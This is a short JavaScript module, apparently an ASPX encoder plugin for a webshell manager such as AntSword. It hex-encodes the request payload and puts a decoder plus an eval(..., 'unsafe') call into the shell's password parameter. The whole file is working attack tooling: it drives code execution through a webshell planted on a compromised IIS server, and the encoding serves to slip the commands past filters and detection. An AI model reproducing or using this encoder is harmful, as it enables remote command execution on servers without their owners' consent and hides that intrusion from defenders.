// 
// aspx::hex 编码模块
// 
// 把除了密码的其他参数都 hex 编码一次
// 

'use strict';

module.exports = (pwd, data) => {

    let randomID = `_0x${Math.random().toString(16).substr(2)}`;
    let hexencoder = "function HexAsciiConvert(hex:String) {var sb:System.Text.StringBuilder = new System.Text.StringBuilder();var i;for(i=0; i< hex.Length; i+=2){sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i,2), System.Globalization.NumberStyles.HexNumber))));}return sb.ToString();};";
    data[randomID] = new Buffer(data['_']).toString('hex');
    data[pwd] = `${hexencoder};eval(HexAsciiConvert(Request.Item["${randomID}"]),"unsafe");`;
    delete data['_'];
    return data;
}